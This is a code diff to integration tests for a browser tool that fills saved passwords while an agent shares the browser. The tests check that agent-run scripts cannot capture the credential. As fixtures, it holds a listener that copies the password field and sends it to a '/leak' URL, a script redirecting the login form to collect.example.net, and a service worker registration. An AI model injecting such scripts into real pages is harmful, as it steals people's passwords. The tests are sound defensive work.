@@ -14,6 +14,7 @@ from __future__ import annotations
 import base64
 import logging
 import os
+import shlex
 from contextlib import contextmanager
 from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
 from threading import Thread
@@ -24,7 +25,7 @@ from uuid import uuid4
 import pytest
 
 from host_access import (
-    browser_control, browser_fill_marks, browser_login_fill as fill, browser_login_page as page,
+    browser_cdp, browser_control, browser_fill_marks, browser_login_fill as fill, browser_login_page as page,
     browser_session_commands, browser_step_lifecycle as lifecycle,
 )
 from host_access.browser_sessions import BrowserSessionOwner
@@ -45,6 +46,13 @@ Show sign-in</button>{FORM.replace('<form ', '<form hidden ')}"""
 MOVED = LOGIN + "<script>document.querySelector('form').action = 'https://collect.example.net/p';</script>"
 # The password field shows its text once focused: a password must never go into a visible text field.
 FLIPS = LOGIN.replace("<input type=password name=pw>", "<input type=password name=pw onfocus=\"this.type = 'text'\">")
+# A service worker sees every later request of its scope, on every later page of the site.
+WORKER = "self.addEventListener('fetch', () => {});"
+# An agent's input listener that copies the password field anywhere an agent could read it.
+COPIER = ("document.querySelector('input[type=password]').addEventListener('input', event => {"
+          " const value = event.target.value; document.title = value; console.log(value);"
+          " const p = document.createElement('p'); p.textContent = btoa(value); document.body.append(p);"
+          " fetch('/leak?v=' + encodeURIComponent(value)); }); 'added'")
 
 
 @contextmanager
@@ -53,18 +61,21 @@ def site(accepted: str, *, reject: bool = False):
     pages = {"/login.html": LOGIN, "/home.html": HOME, "/later.html": LATER, "/moved.html": MOVED, "/flips.html": FLIPS}
 
     class Handler(BaseHTTPRequestHandler):
-        def _send(self, status: int, body: str = "", location: str | None = None) -> None:
+        def _send(self, status: int, body: str = "", location: str | None = None, kind: str = "text/html") -> None:
             data = body.encode()
             self.send_response(status)
             if location:
                 self.send_header("Location", location)
-            self.send_header("Content-Type", "text/html; charset=utf-8")
+            self.send_header("Content-Type", f"{kind}; charset=utf-8")
             self.send_header("Content-Length", str(len(data)))
             self.end_headers()
             self.wfile.write(data)
 
         def do_GET(self):  # noqa: N802 - BaseHTTPRequestHandler protocol name
-            body = pages.get(self.path.split("?")[0])
+            path = self.path.split("?")[0]
+            if path == "/sw.js":
+                return self._send(200, WORKER, kind="text/javascript")
+            body = pages.get(path)
             self._send(200, body) if body else self._send(404)
 
         def do_POST(self):  # noqa: N802
@@ -168,22 +179,48 @@ async def _after_fill_reads(run) -> None:
 
 @pytest.mark.integration
 @pytest.mark.asyncio
-async def test_a_listener_an_agent_added_never_sees_the_value(browser, monkeypatch):
-    """An agent's eval adds an input listener that copies the field anywhere readable; the fill reloads first."""
+@pytest.mark.parametrize("batched", [False, True])
+async def test_a_listener_an_agent_added_never_sees_the_value(browser, monkeypatch, batched):
+    """An agent's eval, alone or in a batch after an open, adds an input listener that copies the field anywhere
+    readable. Its script marked the site (alone) or the session (batch), so the sign-in is the person's."""
     with site("unused") as (origin, posts):
-        login_id = _save(browser, _admit_fixture(monkeypatch, origin))
+        site_origin = _admit_fixture(monkeypatch, origin)
+        login_id = _save(browser, site_origin)
         try:
-            await _agent(browser, "open", f"{origin}/later.html")
-            copier = ("document.querySelector('input[type=password]').addEventListener('input', event => {"
-                      " const value = event.target.value; document.title = value; console.log(value);"
-                      " const p = document.createElement('p'); p.textContent = btoa(value); document.body.append(p);"
-                      " fetch('/leak?v=' + encodeURIComponent(value)); }); 'added'")
-            assert "added" in await _agent(browser, "eval", copier)
+            if batched:
+                added = await _agent(browser, "batch", f"open {origin}/later.html", f"eval {shlex.quote(COPIER)}")
+            else:
+                await _agent(browser, "open", f"{origin}/later.html")
+                added = await _agent(browser, "eval", COPIER)
+            assert "added" in added, added
             await _agent(browser, "click", "button")
             text = await fill.fill_saved_login(browser.thread, login_id)
             browser.outputs.append(text)
-            # The reload took the listener and hid the form again, so nothing was typed.
-            assert text == fill.REFUSED["no_field"], text
+            assert text.startswith(fill.NOT_CLEAN.format(site=site_origin)), text
+            assert browser.declared == [f"Sign in to {site_origin} yourself"]
+            assert posts == []
+            await _after_fill_reads(browser)
+        finally:
+            await browser.owner.shutdown()
+
+
+@pytest.mark.integration
+@pytest.mark.asyncio
+async def test_a_service_worker_an_agent_registered_on_another_page_of_the_site_makes_the_sign_in_the_persons(
+        browser, monkeypatch):
+    with site("unused") as (origin, posts):
+        site_origin = _admit_fixture(monkeypatch, origin)
+        login_id = _save(browser, site_origin)
+        try:
+            await _agent(browser, "open", f"{origin}/home.html")
+            registered = await _agent(browser, "eval", "navigator.serviceWorker.register('/sw.js')"
+                                      ".then(() => navigator.serviceWorker.ready).then(() => 'registered')")
+            assert "registered" in registered, registered
+            await _agent(browser, "open", f"{origin}/login.html")
+            text = await fill.fill_saved_login(browser.thread, login_id)
+            browser.outputs.append(text)
+            assert text.startswith(fill.NOT_CLEAN.format(site=site_origin)), text
+            assert browser.declared == [f"Sign in to {site_origin} yourself"]
             assert posts == []
             await _after_fill_reads(browser)
         finally:
@@ -217,7 +254,7 @@ async def test_a_password_field_that_turns_into_a_text_field_gets_nothing(browse
             browser.outputs.append(text)
             assert text == fill.REFUSED["changed"], text
             assert posts == []
-            async with page.QuietCdp(await browser.owner.page_endpoint(browser.thread)) as cdp:
+            async with browser_cdp.CdpClient(await browser.owner.page_endpoint(browser.thread)) as cdp:
                 typed = await cdp.call("Runtime.evaluate", returnByValue=True,
                                        expression="document.querySelector('input[name=pw]').value.length")
             assert typed["result"]["value"] == 0
@@ -259,8 +296,8 @@ async def test_a_clean_sign_in_fills_submits_and_reports_success(browser, monkey
             assert text == f"Signed in to {site_origin} as {USER} with the saved login.", text
             assert posts == [{"user": USER, "matched": True}]
             assert saved_logins.get_login(login_id).last_used_by_thread_id == browser.thread
-            # The session is under the filled-field allowlist from the fill on.
-            assert browser_control.FILLED_FIELD_REFUSED in await _agent(browser, "eval", "document.title")
+            # From the fill on, the whole session runs only the saved-sign-in commands, on every page.
+            assert browser_session_commands.SAVED_FILL_SESSION_REFUSED in await _agent(browser, "eval", "document.title")
             await _after_fill_reads(browser)
         finally:
             await browser.owner.shutdown()
